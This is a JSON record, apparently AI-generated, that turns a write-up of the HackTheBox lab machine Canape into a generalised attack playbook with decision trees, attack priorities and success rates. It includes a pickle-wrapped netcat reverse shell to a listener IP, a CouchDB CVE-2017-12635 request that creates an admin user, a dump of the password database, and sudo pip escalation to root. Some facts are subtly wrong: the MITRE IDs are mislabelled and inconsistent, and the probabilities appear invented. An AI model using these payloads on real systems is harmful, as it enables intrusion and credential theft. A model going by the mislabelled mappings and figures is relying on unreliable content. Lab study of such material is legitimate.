{
  "writeup_id": "Htb_Canape",
  "scenario_fingerprint": {
    "scenario_name": "flask_pickle_deserialization_git_exposure",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "80+65535",
    "service_combination": "apache+ssh_nonstandard",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "pickle_deserialization",
    "privilege_path": "web_to_user_to_root",
    "attack_complexity": "medium",
    "estimated_time": "90-120 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "exposed_git_repository",
      "flask_application",
      "pickle_deserialization_vulnerability",
      "couchdb_backend"
    ],
    "environmental_clues": [
      "git_directory_exposed",
      "apache_ubuntu_server",
      "ssh_on_nonstandard_port",
      "flask_framework_indicators"
    ],
    "similar_scenarios": [
      "node_htb_medium",
      "jerry_htb_easy"
    ],
    "unique_aspects": [
      "pickle_loads_vulnerability",
      "whitelist_bypass_required",
      "couchdb_privilege_escalation",
      "sudo_pip_to_root"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Exposed Git Repository",
        "success_reason": "Git repository exposed on web server allowing source code access",
        "prerequisite_indicators": [
          "web_server_accessible",
          "git_directory_exposed",
          "directory_listing_enabled"
        ],
        "recognition_patterns": [
          "nmap http-git script detection",
          "/.git/ directory accessible",
          "git repository structure visible"
        ],
        "failure_modes": [
          "git_directory_protected",
          "incomplete_git_history",
          "source_code_obfuscated"
        ],
        "environmental_factors": [
          "developer_deployment_mistakes",
          "insufficient_web_server_hardening",
          "default_apache_configuration"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "Pickle Deserialization",
        "success_reason": "Flask application used cPickle.loads on user-controlled data",
        "prerequisite_indicators": [
          "python_application_detected",
          "file_upload_functionality",
          "deserialization_code_present"
        ],
        "recognition_patterns": [
          "cPickle.loads in source code",
          "user input written to files",
          "check endpoint for processing"
        ],
        "failure_modes": [
          "input_sanitization_present",
          "safe_deserialization_methods",
          "restricted_file_permissions"
        ],
        "environmental_factors": [
          "python2_environment",
          "flask_web_framework",
          "insecure_coding_practices"
        ],
        "success_probability": 0.95,
        "typical_timeframe": "30-60 minutes"
      },
      {
        "technique": "CouchDB Exploitation",
        "success_reason": "CouchDB accessible with default/weak configuration",
        "prerequisite_indicators": [
          "couchdb_service_running",
          "localhost_access_available",
          "weak_authentication"
        ],
        "recognition_patterns": [
          "couchdb references in source",
          "port 5984 accessible",
          "database enumeration possible"
        ],
        "failure_modes": [
          "strong_authentication_required",
          "network_segmentation",
          "updated_couchdb_version"
        ],
        "environmental_factors": [
          "default_couchdb_installation",
          "internal_service_exposure",
          "legacy_database_configuration"
        ],
        "success_probability": 0.78,
        "typical_timeframe": "20-45 minutes"
      },
      {
        "technique": "Sudo Pip Privilege Escalation",
        "success_reason": "User had sudo rights to run pip without password",
        "prerequisite_indicators": [
          "sudo_privileges_available",
          "pip_executable_accessible",
          "python_environment_present"
        ],
        "recognition_patterns": [
          "sudo -l shows pip permissions",
          "python package manager available",
          "setup.py execution possible"
        ],
        "failure_modes": [
          "restricted_sudo_configuration",
          "pip_not_available",
          "python_environment_locked"
        ],
        "environmental_factors": [
          "development_environment_setup",
          "loose_sudo_configuration",
          "python_development_tools"
        ],
        "success_probability": 0.89,
        "typical_timeframe": "15-30 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Flask source code via git repository",
        "discovery_method": "wget --mirror on exposed .git directory",
        "why_critical": "Revealed pickle deserialization vulnerability and application logic",
        "how_to_recognize": [
          "nmap http-git script detection",
          "/.git/ directory browsable",
          "git repository structure present"
        ],
        "follow_up_actions": [
          "git_checkout_full_source",
          "analyze_application_logic",
          "identify_deserialization_points"
        ]
      },
      {
        "discovery": "cPickle.loads vulnerability in /check endpoint",
        "discovery_method": "Source code analysis of Flask application",
        "why_critical": "Allowed arbitrary code execution through pickle deserialization",
        "how_to_recognize": [
          "cPickle.loads on user data",
          "file upload with known naming",
          "processing endpoint available"
        ],
        "follow_up_actions": [
          "craft_pickle_payload",
          "bypass_whitelist_restrictions",
          "trigger_deserialization"
        ]
      },
      {
        "discovery": "CouchDB credentials and configuration",
        "discovery_method": "Local service enumeration after initial shell",
        "why_critical": "Provided access to user credentials and database manipulation",
        "how_to_recognize": [
          "couchdb service running locally",
          "database references in source",
          "weak or default authentication"
        ],
        "follow_up_actions": [
          "enumerate_databases",
          "extract_user_credentials",
          "exploit_couchdb_vulnerabilities"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "www-data",
        "escalation_method": "CouchDB_credential_extraction",
        "why_possible": "CouchDB contained user passwords and was accessible locally",
        "recognition_signs": [
          "couchdb_service_enumeration",
          "database_credential_storage",
          "weak_database_authentication"
        ],
        "exploitation_path": "CouchDB access → User credential extraction → SSH login"
      },
      {
        "privilege_level": "user",
        "escalation_method": "sudo_pip_exploitation",
        "why_possible": "User had sudo rights to run pip without password restrictions",
        "recognition_signs": [
          "sudo_l_shows_pip_access",
          "python_package_installation_rights",
          "setup_py_execution_possible"
        ],
        "exploitation_path": "sudo pip → malicious setup.py → root shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found exposed .git repository on web application",
        "decision": "Download complete git repository for source code analysis",
        "reasoning": "Exposed git repos often contain sensitive information and full application source code",
        "confidence": 0.95,
        "alternatives": [
          {
            "option": "directory_bruteforce",
            "when": "if git download fails"
          },
          {
            "option": "web_vulnerability_scanning",
            "when": "if no source code available"
          }
        ],
        "success_indicators": [
          "source_code_downloaded",
          "git_history_accessible",
          "configuration_files_found"
        ],
        "next_decision": "analyze_source_code_for_vulnerabilities"
      },
      {
        "step": 2,
        "situation": "Found Flask application with pickle deserialization in source code",
        "decision": "Exploit pickle deserialization vulnerability for code execution",
        "reasoning": "Pickle deserialization allows arbitrary code execution through __reduce__ method",
        "confidence": 0.9,
        "prerequisites": [
          "source_code_analyzed",
          "pickle_loads_identified",
          "user_input_path_found"
        ],
        "success_indicators": [
          "reverse_shell_obtained",
          "command_execution_confirmed"
        ],
        "failure_fallbacks": [
          "other_web_vulnerabilities",
          "parameter_tampering"
        ]
      },
      {
        "step": 3,
        "situation": "Obtained www-data shell, found CouchDB running locally",
        "decision": "Enumerate CouchDB databases for privilege escalation",
        "reasoning": "Local services often contain credentials or sensitive data",
        "confidence": 0.8,
        "prerequisites": [
          "local_shell_access",
          "couchdb_service_identified"
        ],
        "success_indicators": [
          "databases_enumerated",
          "credentials_found",
          "admin_access_gained"
        ],
        "failure_fallbacks": [
          "file_system_enumeration",
          "process_enumeration",
          "network_services_scan"
        ]
      },
      {
        "step": 4,
        "situation": "Found user credentials in CouchDB",
        "decision": "Use discovered credentials for lateral movement",
        "reasoning": "Database credentials often reused for system accounts",
        "confidence": 0.85,
        "prerequisites": [
          "couchdb_access",
          "user_credentials_found"
        ],
        "success_indicators": [
          "user_shell_obtained",
          "ssh_access_gained"
        ],
        "failure_fallbacks": [
          "credential_spraying",
          "other_services_testing"
        ]
      },
      {
        "step": 5,
        "situation": "User has sudo rights to run pip",
        "decision": "Exploit sudo pip for root privilege escalation",
        "reasoning": "Pip can execute arbitrary code during package installation",
        "confidence": 0.95,
        "prerequisites": [
          "user_access",
          "sudo_pip_identified"
        ],
        "success_indicators": [
          "root_shell_obtained",
          "root_flag_accessible"
        ],
        "failure_fallbacks": [
          "other_sudo_commands",
          "kernel_exploits",
          "suid_binaries"
        ]
      }
    ],
    "branching_logic": {
      "if_git_repo_found": {
        "action": "download_and_analyze_source",
        "tools": [
          "wget",
          "git"
        ],
        "next_phase": "source_code_vulnerability_analysis"
      },
      "if_pickle_vulnerability_found": {
        "action": "craft_deserialization_exploit",
        "tools": [
          "python",
          "cPickle"
        ],
        "payload_type": "reverse_shell_through_reduce_method"
      },
      "if_shell_obtained": {
        "action": "enumerate_local_services",
        "focus": [
          "databases",
          "internal_ports",
          "configuration_files"
        ],
        "tools": [
          "netstat",
          "curl",
          "ps"
        ]
      },
      "if_couchdb_found": {
        "action": "enumerate_databases_and_documents",
        "endpoints": [
          "/_all_dbs",
          "/database/_all_docs",
          "/database/id"
        ],
        "look_for": [
          "passwords",
          "_users",
          "credentials"
        ]
      },
      "if_sudo_pip_found": {
        "action": "create_malicious_package_for_execution",
        "method": "setup.py_with_os_commands",
        "escalation": "direct_to_root"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_for_exposed_git_repos_first",
        "reasoning": "source_code_provides_direct_path_to_vulnerabilities",
        "applicability": "web_applications"
      },
      {
        "rule": "prioritize_deserialization_vulnerabilities",
        "reasoning": "high_impact_code_execution_with_minimal_requirements",
        "applicability": "python_applications_with_pickle"
      },
      {
        "rule": "enumerate_local_databases_after_shell_access",
        "reasoning": "databases_commonly_contain_credentials_for_lateral_movement",
        "applicability": "any_initial_shell_access"
      },
      {
        "rule": "check_sudo_rights_for_package_managers",
        "reasoning": "pip_npm_gem_often_allow_code_execution_as_root",
        "applicability": "user_level_access_obtained"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Git Repository Exposure",
        "mitre_id": "T1213.002",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "web_server_running",
          "git_directory_accessible",
          "directory_listing_enabled"
        ],
        "success_indicators": [
          "git_directory_browsable",
          "git_objects_accessible",
          "source_code_recoverable"
        ],
        "incompatible_with": [
          "git_directory_blocked",
          "proper_access_controls",
          "web_server_hardened"
        ],
        "confidence_boosters": [
          "nmap_http_git_script_positive",
          "manual_git_path_verification",
          "wget_mirror_successful"
        ],
        "typical_success_rate": 0.95,
        "estimated_time": "2-5 minutes"
      },
      {
        "technique": "Python Pickle Deserialization",
        "mitre_id": "T1055.001",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "python_application_running",
          "pickle_loads_in_code",
          "user_controlled_input",
          "file_upload_functionality"
        ],
        "success_indicators": [
          "pickle_import_in_source",
          "loads_function_called",
          "user_input_reaches_pickle"
        ],
        "incompatible_with": [
          "input_sanitization_present",
          "pickle_disabled",
          "safe_deserialization_used"
        ],
        "confidence_boosters": [
          "flask_application_detected",
          "source_code_available",
          "cPickle_imports_found"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "CouchDB Exploitation",
        "mitre_id": "T1190",
        "required_services": [
          "couchdb"
        ],
        "required_ports": [
          5984,
          6984
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "couchdb_service_running",
          "admin_interface_accessible",
          "default_credentials_present"
        ],
        "success_indicators": [
          "couchdb_banner_detected",
          "admin_interface_reachable",
          "database_enumeration_possible"
        ],
        "incompatible_with": [
          "authentication_required",
          "network_isolation",
          "patched_version"
        ],
        "confidence_boosters": [
          "version_disclosure_available",
          "known_cve_applicable",
          "admin_party_mode_enabled"
        ],
        "typical_success_rate": 0.78,
        "estimated_time": "15-45 minutes"
      },
      {
        "technique": "Sudo Pip Privilege Escalation",
        "mitre_id": "T1548.003",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "sudo_rights_to_pip",
          "pip_installed",
          "user_shell_access"
        ],
        "success_indicators": [
          "sudo_l_shows_pip",
          "pip_command_available",
          "package_installation_possible"
        ],
        "incompatible_with": [
          "pip_not_installed",
          "sudo_restrictions_present",
          "no_shell_access"
        ],
        "confidence_boosters": [
          "gtfobins_pip_entry",
          "python_environment_present",
          "writable_temp_directory"
        ],
        "typical_success_rate": 0.96,
        "estimated_time": "5-10 minutes"
      }
    ],
    "environmental_detectors": {
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https",
          "apache",
          "nginx"
        ],
        "banner_indicators": [
          "Apache",
          "nginx",
          "Flask",
          "Django"
        ],
        "confidence_threshold": 0.9
      },
      "git_repository": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "path_indicators": [
          "/.git/",
          "/.git/config",
          "/.git/HEAD"
        ],
        "confidence_threshold": 0.95
      },
      "python_application": {
        "port_indicators": [
          80,
          443,
          5000,
          8000
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "Flask",
          "Django",
          "Python",
          "Werkzeug"
        ],
        "confidence_threshold": 0.85
      },
      "couchdb": {
        "port_indicators": [
          5984,
          6984
        ],
        "service_indicators": [
          "couchdb"
        ],
        "banner_indicators": [
          "CouchDB",
          "Apache CouchDB"
        ],
        "confidence_threshold": 0.92
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "git_repository_exposure",
          "when": "git_directory_detected",
          "reason": "immediate_source_code_access_high_success_rate"
        },
        {
          "attack": "pickle_deserialization",
          "when": "python_app_with_pickle_detected",
          "reason": "direct_code_execution_reliable"
        }
      ],
      "medium_priority": [
        {
          "attack": "couchdb_exploitation",
          "when": "couchdb_service_detected",
          "reason": "database_access_credential_harvesting"
        },
        {
          "attack": "sudo_pip_escalation",
          "when": "user_shell_with_sudo_pip",
          "reason": "reliable_privilege_escalation"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Git Repository Exposure",
        "mitre_id": "T1213.003",
        "category": "collection",
        "phase": "reconnaissance",
        "tools_used": [
          {
            "name": "wget",
            "command_template": "wget --mirror -I .git {target}/.git",
            "actual_command": "wget --mirror -I .git 10.10.10.70/.git",
            "output_pattern": "complete git repository structure",
            "effectiveness_rating": 5,
            "reliability": 0.98
          },
          {
            "name": "git",
            "command_template": "git checkout -- .",
            "actual_command": "git checkout -- .",
            "success_factors": [
              "exposed_git_directory",
              "readable_git_objects"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "exposed_git_directory",
          "web_accessible_git_folder"
        ],
        "success_indicators": [
          "source_code_recovered",
          "commit_history_accessible",
          "sensitive_data_in_commits"
        ],
        "common_failures": [
          "incomplete_git_directory",
          "corrupted_git_objects",
          "access_restrictions"
        ],
        "follow_up_techniques": [
          "source_code_analysis",
          "credential_extraction",
          "vulnerability_identification"
        ],
        "time_investment": "2-10 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "Python Pickle Deserialization",
        "mitre_id": "T1055.001",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "cPickle",
            "command_template": "cPickle.dumps(ExploitClass(command))",
            "actual_command": "cPickle.dumps(Exploit('rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2>&1 | nc 10.10.15.48 4444 > /tmp/0xdf'))",
            "output_pattern": "serialized pickle object",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "pickle_loads_user_input",
          "python_application",
          "file_upload_capability"
        ],
        "success_indicators": [
          "reverse_shell_connection",
          "command_execution_confirmed",
          "application_level_access"
        ],
        "common_failures": [
          "input_validation_blocks_exploit",
          "network_connectivity_issues",
          "python_version_mismatch"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "lateral_movement",
          "persistence_establishment"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "CouchDB Privilege Escalation",
        "mitre_id": "T1068",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl -X PUT -d '{\"type\":\"user\",\"name\":\"{username}\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"{password}\"}' localhost:5984/_users/org.couchdb.user:{username} -H \"Content-Type:application/json\"",
            "actual_command": "curl -X PUT -d '{\"type\":\"user\",\"name\":\"0xdf\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"df\"}' localhost:5984/_users/org.couchdb.user:0xdf -H \"Content-Type:application/json\"",
            "output_pattern": "{\"ok\":true,\"id\":\"org.couchdb.user:",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "couchdb_accessible",
          "vulnerable_couchdb_version",
          "json_parser_discrepancy"
        ],
        "success_indicators": [
          "admin_user_created_successfully",
          "access_to_restricted_databases",
          "credential_extraction_possible"
        ],
        "common_failures": [
          "patched_couchdb_version",
          "authentication_required",
          "network_access_restrictions"
        ],
        "follow_up_techniques": [
          "database_enumeration",
          "credential_extraction",
          "lateral_movement"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "wget",
        "use_case": "git_repository_extraction",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "exposed_git_repositories"
        ],
        "alternatives": [
          "manual_directory_traversal",
          "git_dumper"
        ],
        "best_practices": [
          "use_mirror_flag_for_complete_copy",
          "specify_git_directory_with_I_flag",
          "verify_complete_download"
        ]
      },
      {
        "tool": "cPickle",
        "use_case": "python_deserialization_exploit",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "medium",
        "essential_for": [
          "python_pickle_vulnerabilities"
        ],
        "alternatives": [
          "other_serialization_libraries"
        ],
        "best_practices": [
          "match_python_version_with_target",
          "implement_reduce_method_for_execution",
          "test_payload_locally_first"
        ]
      },
      {
        "tool": "curl",
        "use_case": "couchdb_exploitation",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "low",
        "essential_for": [
          "couchdb_interactions"
        ],
        "alternatives": [
          "specialized_couchdb_clients",
          "browser_based_tools"
        ],
        "best_practices": [
          "enumerate_databases_first",
          "check_version_for_known_vulnerabilities",
          "use_proper_content_type_headers"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "git_to_pickle_rce",
        "steps": [
          {
            "step": 1,
            "command": "wget --mirror -I .git 10.10.10.70/.git",
            "purpose": "Download exposed git repository",
            "expected_output": "Complete git repository structure"
          },
          {
            "step": 2,
            "command": "git checkout -- .",
            "purpose": "Restore source code from git",
            "expected_output": "Flask application source code"
          },
          {
            "step": 3,
            "command": "python exploit_script.py 10.10.15.48 4444",
            "purpose": "Execute pickle deserialization exploit",
            "expected_output": "Reverse shell as www-data"
          }
        ],
        "success_rate": 0.92,
        "typical_duration": "10-30 minutes"
      },
      {
        "sequence_name": "couchdb_privilege_escalation",
        "steps": [
          {
            "step": 1,
            "command": "curl http://localhost:5984/_all_dbs",
            "purpose": "Enumerate available databases",
            "expected_output": "List of database names including passwords"
          },
          {
            "step": 2,
            "command": "curl -X PUT -d '{\"type\":\"user\",\"name\":\"0xdf\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"df\"}' localhost:5984/_users/org.couchdb.user:0xdf -H \"Content-Type:application/json\"",
            "purpose": "Exploit CVE-2017-12635 to create admin user",
            "expected_output": "Success message with user ID"
          },
          {
            "step": 3,
            "command": "curl http://0xdf:df@localhost:5984/passwords",
            "purpose": "Access restricted password database",
            "expected_output": "Database contents with credentials"
          }
        ],
        "success_rate": 0.88,
        "typical_duration": "5-15 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Canape",
      "difficulty": "Medium",
      "os": "Linux (Ubuntu)",
      "platform": "HackTheBox",
      "release_date": "2018-04-14",
      "author": "overcast",
      "estimated_time": "2-3 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "web_application",
        "deserialization",
        "database_exploitation"
      ],
      "key_vulnerabilities": [
        "pickle_deserialization",
        "exposed_git_repo",
        "couchdb_privilege_escalation",
        "sudo_pip_abuse"
      ],
      "environment_type": "web_application_with_database",
      "real_world_relevance": "high",
      "learning_value": [
        "python_deserialization",
        "git_enumeration",
        "couchdb_exploitation",
        "sudo_abuse"
      ],
      "prerequisite_knowledge": [
        "python_flask",
        "pickle_serialization",
        "git_basics",
        "database_fundamentals"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "deserialization_attacks",
        "database_exploitation",
        "privilege_escalation"
      ],
      "attack_types": [
        "code_execution",
        "credential_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "secure_git_repositories",
        "avoid_pickle_deserialization",
        "database_hardening",
        "sudo_restrictions"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Pickle Rick",
        "Node",
        "Jasmin"
      ],
      "similarity_reasons": [
        "deserialization_vulnerabilities",
        "web_application_focus",
        "database_exploitation"
      ],
      "unique_aspects": [
        "flask_pickle_combo",
        "couchdb_exploitation",
        "multiple_cve_exploration"
      ],
      "difficulty_factors": [
        "multiple_attack_vectors",
        "database_knowledge_required",
        "complex_privilege_escalation"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T23:53:02.640924",
    "original_file": "0xdf_writeups/Htb Canape.md",
    "content_length": 37190,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}